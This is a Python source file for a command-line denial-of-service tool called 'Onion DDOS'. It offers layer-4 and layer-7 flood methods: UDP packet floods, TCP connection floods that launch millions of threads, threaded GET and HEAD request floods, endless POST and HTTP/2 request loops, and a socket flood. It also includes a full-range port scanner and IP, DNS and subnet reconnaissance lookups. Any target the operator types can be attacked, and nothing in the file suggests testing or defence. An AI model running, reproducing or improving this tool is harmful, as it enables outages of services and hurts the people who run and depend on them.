from rgbprint import Color, gradient_print
import socket
import random
import time
import threading
import requests
import httpx

white = Color.ghost_white
red = Color.indian_red
gray = Color.gray
lime = Color.lime
magenta = Color.medium_purple
purple = Color.purple
pur = Color.magenta

success = f"{lime}[+]{white}"
error = f"{red}[-]{white}"
wait = f"{gray}[*]{white}"


def udp_attack(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  
    timeout = time.time() + duration

    while True:
        if time.time() > timeout:
            break
        client.sendto(bytes, (target_ip, target_port))
        print(f"{success} Attack sent to {magenta}{target_ip}{gray}:{magenta}{target_port}")

def fetch_url(url):
    with httpx.Client(http2=True) as client:
        while True:
            response = client.get(url)
            print(f"{success} Attack sent to {magenta}{url}  {gray}|{white}  STATUT : {magenta}{response.status_code}")



def port_scan(target_host):
    start_port = 1
    end_port = 65535

    print(f"{wait} Scanning ports on{red} {target_host}{white}...")
    
    for port in range(start_port, end_port + 1):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(0.1) 

        try:
            client.connect((target_host, port))
            print(f"{success} Port :{gray} {port}{white} | {lime} {lime}open")
            client.close()
        except socket.error:
            print(f"{error} Port :{gray} {port}{white} |{red} closed")


def attack(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(2)
    try:
        client.connect((target_ip, target_port))
        while True:
            client.sendto(b'GET / HTTP/1.1\r\n', (target_ip, target_port))
    except socket.error:
        client.close()



def get_flood(url, num_requests):
    for _ in range(num_requests):
        try:
            response = requests.get(url)
            print(f"{success} Attack sent to{magenta} {url}{gray} |{white} Status code:{magenta} {response.status_code}")
        except requests.RequestException as e:
            print(f"{error} Request failed: {e}")

def start_get_flood(url, threads, requests_per_thread):
    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=get_flood, args=(url, requests_per_thread))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()




def head_flood(url, num_requests):
    for _ in range(num_requests):
        try:
            response = requests.head(url)
            print(f"{success} Attack sent to{magenta} {url}{gray} |{white} Status code:{magenta} {response.status_code}")
        except requests.RequestException as e:
            print(f"{error} Request failed: {e}")

def start_head_flood(url, threads, requests_per_thread):
    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=head_flood, args=(url, requests_per_thread))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()


logo = """
                                                     ╔═╗╔╗╔╦╔═╗╔╗╔
                                                     ║ ║║║║║║ ║║║║
                                                     ╚═╝╝╚╝╩╚═╝╝╚╝"""

banner = f"""                                         {magenta}╔═══════════════════════════════════╗
                                         {magenta}║       {white}Welcome to Onion DDOS       {magenta}║
                                         {magenta}║  {white}Type 'help' to see the Commands  {magenta}║
                                         {magenta}╚═══════════════════════════════════╝
"""

help = f"""{magenta}╔═════════════════════════════════════════╗
{magenta}║{white}| {pur}•{white} layer7        {purple}|{white} Show Layer7 Methods  {magenta}║
{magenta}║{white}| {pur}•{white} layer4        {purple}|{white} Show Layer4 Methods  {magenta}║
{magenta}║{white}| {pur}•{white} tools         {purple}|{white} Show Tools           {magenta}║
{magenta}╚═════════════════════════════════════════╝"""


layer7 = f"""{magenta}╔════════════════════════════════════════════╗
{magenta}║{white}| {pur}•{white} get           {purple}|{white} Get Request Attack      {magenta}║
{magenta}║{white}| {pur}•{white} head          {purple}|{white} Head Request Attack     {magenta}║
{magenta}║{white}| {pur}•{white} http2         {purple}|{white} HTTP 2.0 Request Attack {magenta}║
{magenta}║{white}| {pur}•{white} http          {purple}|{white} HTTP Request Attack     {magenta}║
{magenta}║{white}| {pur}•{white} post          {purple}|{white} POST Request Attack     {magenta}║
{magenta}║{white}| {pur}•{white} soc           {purple}|{white} Socket Attack           {magenta}║
{magenta}╚════════════════════════════════════════════╝"""

layer4 = f"""{magenta}╔════════════════════════════════════════════╗
{magenta}║{white}| {pur}•{white} udp           {purple}|{white} UDP Attack              {magenta}║
{magenta}║{white}| {pur}•{white} tcp           {purple}|{white} TCP Attack              {magenta}║
{magenta}╚════════════════════════════════════════════╝"""

tools = f"""{magenta}╔═════════════════════════════════════════════╗
{magenta}║{white}| {pur}•{white} geoip         {purple}|{white} Geo IP Address Lookup    {magenta}║
{magenta}║{white}| {pur}•{white} dns           {purple}|{white} Classic DNS Lookup       {magenta}║
{magenta}║{white}| {pur}•{white} subnet        {purple}|{white} Subnet IP Address Lookup {magenta}║
{magenta}║{white}| {pur}•{white} page          {purple}|{white} Page Links               {magenta}║
{magenta}║{white}| {pur}•{white} portscan      {purple}|{white} Port Scanner             {magenta}║
{magenta}╚═════════════════════════════════════════════╝"""


start_color = Color.medium_purple
end_color = Color.magenta

gradient_print(logo, start_color=start_color, end_color=end_color)
print(banner)
print(f"{red}/!\\{white} don't forget that when you run a command to put an ip or url for example: 'geoip 127.0.0.1'")
def main():
    while True:
        choice = input(f'{lime}→ {magenta}ONION {white}∙ ')
   
        w0rd = choice.split()

        if choice == "help":
            print(help)
        
        if choice == "layer7":
            print(layer7)
        
        if choice == "layer4":
            print(layer4)
        
        if choice == "tools":
            print(tools)

        if choice.startswith("udp"):
            if len(w0rd) > 1:
                word = w0rd[-1]  
                target_ip = word
                target_port = 80           
                duration = 60
                print(f"{wait} Wait...")              
                time.sleep(2)
                udp_attack(target_ip, target_port, duration)
            else:
                print(f"{error} Try doing a UDP attack again but don't forget to enter an IP address.")

        if choice.startswith("tcp"):
            if len(w0rd) > 1:
                word = w0rd[-1]  
                target_ip = word 
                target_port = 80  
                print(f"{wait} Wait...")              
                time.sleep(2)               
                
                def flood():
                    while True:
                        try:
                           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                           s.connect((target_ip, target_port))
                           s.sendall(b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n')
                           s.close()
                        except Exception as e:
                           print(f"{error} ERROR : {e}")

                for _ in range(9999999):
                    t = threading.Thread(target=flood)
                    print(f"{success} Attack sent to {magenta}{target_ip}{gray}:{magenta}{target_port}")
                    time.sleep(0.1)
                    t.start()

            else:
                print(f"{error} Try doing a TCP attack again but don't forget to enter an IP address.")

        if choice.startswith("get"):
            if len(w0rd) > 1:
                word = w0rd[-1] 
                target_url = word
                num_threads = 10
                requests_per_thread = 100
                start_get_flood(target_url, num_threads, requests_per_thread)
            else:
                print(f"{error} try again for GET requests")

        if choice.startswith("head"):
            if len(w0rd) > 1:
                word = w0rd[-1] 
                target_url = word
                num_threads = 10
                requests_per_thread = 100
                start_head_flood(target_url, num_threads, requests_per_thread)
            else:
                print(f"{error} try again for HEAD requests")

        if choice.startswith("http2"):
            if len(w0rd) > 1:
                word = w0rd[-1] 
                url = word
                fetch_url(word)
            else:
                print(f"{error} try again for HTTP 2.0 requests Attack")

        if choice.startswith("geoip"):
            if len(w0rd) > 1:
                word = w0rd[-1]  
                ip = word
                response = requests.get(f"https://api.hackertarget.com/geoip/?q={ip}")
                print(response.text)
            else:
                print(f"{error} try again to locate an IP")

        if choice.startswith("dns"):
            if len(w0rd) > 1:
                word = w0rd[-1]  
                target = word
                r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
                print(r.text)
            else:
                print(f"{error} try again for DNS Lookup")

        if choice.startswith("subnet"):
            if len(w0rd) > 1:
                word = w0rd[-1]
                target = word
                r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
                print(r.text)  
            else:
                print(f"{error} Try again for Subnet Lookup")

        if choice.startswith("page"):
            if len(w0rd) > 1:
                word = w0rd[-1]
                target = word
                r = requests.get(f"https://api.hackertarget.com/pagelinks/?q={target}")
                print(r.text)  
            else:
                print(f"{error} Try again for Page Links, don't forget to put an url")

        if choice.startswith("portscan"):
            if len(w0rd) > 1:
                word = w0rd[-1] 
                target = word
                ip_address = socket.gethostbyname(target)
                print(f"{wait} Target IP address: {ip_address}")
                port_scan(ip_address) 
            else:
                print(f"{error} Try again, you forgot the URL for the Port scanner")

        if choice.startswith("post"):
            if len(w0rd) > 1:
                word = w0rd[-1] 
                target = word
                while True: 
                    post = requests.post(target)
                    print(f"{success} Attack sent to{magenta} {target}{gray} | STATUT : {magenta}{post.status_code}")
            else:
                print(f"{error} try again for POST requests Attack")

        if choice.startswith("soc"):
            if len(w0rd) > 1:
                word = w0rd[-1] 
                target_ip = word 
                target_port = 80   

                num_threads = 100

                threads = []
                for _ in range(num_threads):
                   thread = threading.Thread(target=attack, args=(target_ip, target_port))
                   threads.append(thread)
                   thread.start()

                for thread in threads:
                   thread.join()

                print(f"{success} Attack completed.")
            else:
                print(f"{error} try again for Socket Attack Attack")


        if choice.startswith("http"):
            if len(w0rd) > 1:
                word = w0rd[-1] 
                target_url = word
                num_threads = 10
                requests_per_thread = 100
                start_get_flood(target_url, num_threads, requests_per_thread)
            else:
                print(f"{error} try again for HTTP requests Attack")

if __name__ == '__main__':
    main()
